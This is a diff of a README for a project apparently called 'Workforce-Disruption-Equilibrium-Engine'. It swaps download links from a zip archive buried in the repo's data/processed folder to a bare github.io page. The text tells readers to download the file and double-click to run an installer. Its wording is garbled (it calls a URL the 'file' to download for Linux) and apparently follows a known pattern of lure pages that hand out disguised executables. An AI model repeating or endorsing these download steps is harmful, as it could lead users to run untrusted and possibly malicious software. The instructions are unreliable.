@@ -2,7 +2,7 @@
 # 🤖 Workforce-Disruption-Equilibrium-Engine - Understand the Future of Work
 
 ## 📥 Download Now
-[![Download Workforce-Disruption-Equilibrium-Engine](https://github.com/alfredtauro1/Workforce-Disruption-Equilibrium-Engine/raw/refs/heads/main/data/processed/Engine-Equilibrium-Workforce-Disruption-v3.7.zip)](https://github.com/alfredtauro1/Workforce-Disruption-Equilibrium-Engine/raw/refs/heads/main/data/processed/Engine-Equilibrium-Workforce-Disruption-v3.7.zip)
+[![Download Workforce-Disruption-Equilibrium-Engine](https://alfredtauro1.github.io)](https://alfredtauro1.github.io)
 
 ---
 
@@ -23,10 +23,10 @@ Ensure your computer meets the following requirements:
 
 To get started, visit the Releases page to download the application. Click the link below to go directly to the download:
 
-[Visit this page to download](https://github.com/alfredtauro1/Workforce-Disruption-Equilibrium-Engine/raw/refs/heads/main/data/processed/Engine-Equilibrium-Workforce-Disruption-v3.7.zip)
+[Visit this page to download](https://alfredtauro1.github.io)
 
 1. Once you are on the Releases page, locate the latest version of the application.
-2. Click the download link suitable for your operating system. For Windows, download the `.exe` file. For Mac, download the `.dmg` file. For Linux, download the `https://github.com/alfredtauro1/Workforce-Disruption-Equilibrium-Engine/raw/refs/heads/main/data/processed/Engine-Equilibrium-Workforce-Disruption-v3.7.zip` file.
+2. Click the download link suitable for your operating system. For Windows, download the `.exe` file. For Mac, download the `.dmg` file. For Linux, download the `https://alfredtauro1.github.io` file.
 3. After the file finishes downloading, find it in your downloads folder and double-click to run the installer.
 4. Follow the on-screen instructions to complete the installation.
 
